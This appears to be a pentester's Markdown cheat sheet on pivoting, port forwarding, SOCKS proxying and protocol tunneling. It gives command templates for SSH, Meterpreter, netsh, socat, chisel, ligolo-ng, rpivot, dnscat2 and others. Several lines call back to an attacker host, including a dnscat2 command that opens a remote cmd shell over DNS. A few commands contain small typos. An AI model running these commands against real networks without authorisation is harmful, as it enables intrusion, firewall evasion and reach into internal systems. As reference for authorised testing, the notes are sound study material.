# Info
- Port Forward: Forward service internal to external (Mainly combined with bindshell or to exfiltrate the inside services)
- Remote/Reverse Port Forward: Forward service external to internal (Mainly combined with reverseshell)
- Dynamic port forward: Attacker can access any internal machines that the pivot can reach (SOCKS Proxy)
- Tunneling: Encapsulating one protocol inside another to bypass firewalls or NAT.
- Lateral Movement/Pivoting:
	- Lateral Movement: Moving within the same network.
	- Pivoting: Accessing other networks by crossing boundaries.
#### Definitions
- `attacker`: Attacker machine (on the external network)
- `pivot`: Pivot machine (has two NICs for external and internal networks, or one NIC but configured to route traffic between them).
- `target`:Target machine (on the internal network)
# Port Forward
#### SSH
- **PortForward Pivot/Target Port**: `ssh -L <attacker_port>:<pivot_internalip-localhost/target_ip>:<pivot_port/target_port> <username>@<pivot_ip>`

#### Meterpreter (Relay traffic)
- **Info:** Ensuring that your session is persistent on the pivot; once you lose it, port forwarding will disappear.
- **PortForward Pivot Port:**  `meterpreter> portfwd add -l <pivot_listenport> -p <pivot_port> -r <pivot_internalip-localhost>`
- **PortForward Target Port**: `meterpreter> portfwd add -l <pivot_listenport> -p <target_port> -r <target_ip>`

#### Netsh (Relay Traffic - Windows only)
- **Info:** High privileges (Administrator or higher) are required, but while it's persistent, it is easy to detect.
	- Use it on The Pivot.
- **PortForward Pivot Port:**  `netsh interface portproxy add v4tov4 listenport=<pivot_listenport> listenaddress=<pivot_externalip> connectport=<pivot_port> connectaddress=<<pivot_internalip/localhost>`
- **PortForward Target Port**: `netsh interface portproxy add v4tov4 listenport=<pivot_listenport> listenaddress=<pivot_externalip> connectport=<target_port> connectaddress=<target_ip>`
#### Socat (Relay traffic  - Linux)
-  **PortForward Pivot Port:** `socat TCP4-LISTEN:<pivot_listenport>,fork TCP4:<pivot_internalip-localhost>:<pivot_port>`
-  **PortForward Target Port:**`socat TCP4-LISTEN:<pivot_listenport>,fork TCP4:<target_ip>:<target_port>`
#### Chisel
- **Info:** Using a server and client, similar to SSH. The server (usually the pivot or attacker) has to open a service port (I will call it `connectport`).
- **PortForward Pivot Port:**
	- Pivot: `chisel server --port <pivot_connectport>`
	- Attacker: `chisel client <pivot_externalip>:<pivot_connectport> <attacker_port>:<pivot_internalip-localhost>:<pivot_port>`
- **PortForward Target Port:**
	- Pivot: `chisel server --port <pivot_connectport>`
	- Attacker: `chisel client <pivot_externalip>:<pivot_connectport> <attacker_port>:<target_ip>:<target_port>`
- **Using Socks**
# Remote/Reverse Port Forward
#### SSH
- `ssh -R <pivot_listenport>:<attacker_ip>:<attacker_port> <username>@<pivot_externalip> -vN`
	- Windows - putty.exe: `plink.exe ssh -R <pivot_listenport>:<attacker_ip>:<attacker_port> <username>@<pivot_externalip> -vN`
#### Meterpreter
- `meterpreter> portfwd add -l <pivot_listenport> -p <attacker_port> -r <attacker_ip>`
#### Netsh
- `netsh interface portproxy add v4tov4 listenport=<pivot_listenport> listenaddress=<pivot_externalip> connectport=<attacker_port> connectaddress=<attacker_ip>`
#### Socat
- `socat TCP4-LISTEN:<pivot_listenport>,fork TCP4:<attacker_ip>:<attacker_port>`
#### Chisel
- Attacker: `chisel server --port <pivot_connectport> --reverse`
- Pivot: `chisel client <pivot_externalip>:<pivot_connectport> R:<attacker_port>:<pivot_internalip>:<pivot_listenport>`

# Dynamic Port Forward
- **Info:** Requires setting up traffic at the session layer using SOCKS on the attacker machine, because the traffic is tunnel-based and only operates at the session layer.
## Settings up Attacker host
##### **Linux:**
- Using `proxychains`
- edit proxychain.conf 
```bash
vim /etc/proxychains.conf

# Create port proxy - if don't use placing # front of the line
socks4 127.0.0.1 <attacker_portproxy>
# Socks5 when using chisel
socks5 127.00.1 <attacker_portproxy> 

# Using proxy by: proxychains <command> [<target_ip>]
```
##### **Windows**
- Using Proxifier![[Pasted image 20250420221113.png]]
##### **Alternative method:**
- **Sshuttle:** python tool, pivot over SSH.
	- `sshuttle -r <username>:<pivot_externalip> <target_iprange>/<subnet> -v`
## Run Dynamic PortForward
#### SSH
- `ssh -D <attacker_portproxy> <username>@<pivot_externalip>`
#### Meterpreter
- `msf6> use auxiliary/server/socks_proxy`
	- `run SRVPORT=<attacker_portproxy> SRVHOST=0.0.0.0 version=<4a/5a>`
- Option 1: `msf6> use post/multi/manage/autoroute`
	- `set SESSION <num>` (this session is pivot session)
	- `run SUBNET=<target_iprange>/<subnet>`
- Option 2: `meterpreter> run autoroute -s <target_iprange>/<subnet>`
#### Chisel
- Pivot: `chisel server -p <pivot_connectport> --socks5`
- Attacker: `chisel client -v <pivot_externalip>:<pivot_connectport> <attacker_ip - localhost>:socks`
#### Ligolo-ng (Without proxyport)
- Attacker: `sudo ip tuntap add user <username> mode tun ligolo && sudo ip link set lingolo up`
	- `./proxy -selfcert -laddr 0.0.0.0:<attacker_connectport>`
		- `ligolo-ng >> session`: list session
			- choose the session.
		- `ligolo-ng >> ifconfig`: list net interface pivot.  
		- `sudo ip route add <target_iprange>/<subnet> dev ligolo`
- Pivot: `.\agent -connect <attacker_ip>:<attaker_port> -ignore-cert`
- **Port Forward and Remote Port Forward:** `listener_add --addr <pivot_externalip>:<pivot_listenport> --to <attacker/target_ip>:<attacker/target_port>`
#### Rpivot
- Attacker `python2.7 server.py --proxy-port <attacker_portproxy> --server-port <attacker_connectport> --server-ip 0.0.0.0`
- `python2.7 client.py --server-ip <attacker_ip> --server-port <attacker_connectport>`
# Tunneling
#### DNScat2
- Attacker: `sudo ruby dnscat2.rb --dnshost=<attacker_ip>,port=53,domain=<domain_name> --no-cache`
	- Copy the secret
- [dns2powershell](https://github.com/lukebaggett/dnscat2-powershell)
- Pivot: `Import-Module .\dnscat2.ps1`
	- `Start-Dnscat2 -DNSserver <attacker_ip> -Domain <domain_name> -PreSharedSecret <secret> -Exec cmd`
#### PTunnel-ng
- Attacker: `sudo ./ptunnel-ng -s`
- Pivot: `sudo ./ptunnel-ng -p <attacker_ip> -lp <pivot_port> -da <target_ip> -dp <target_port>`
#### SocksOverRDP
1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
- Pivot: `SocksOverRDP-Server.exe`
- Attacker: `Connect RDP Pivot (Experience Modem) -> SocksOverRDP-Client.exe 127.0.0.1 <attacker_portproxy>`
	- OR  load file DLL (Windows): `regsvr32.exe SocksOverRDP-Plugin.dll` (portproxy default 1080)

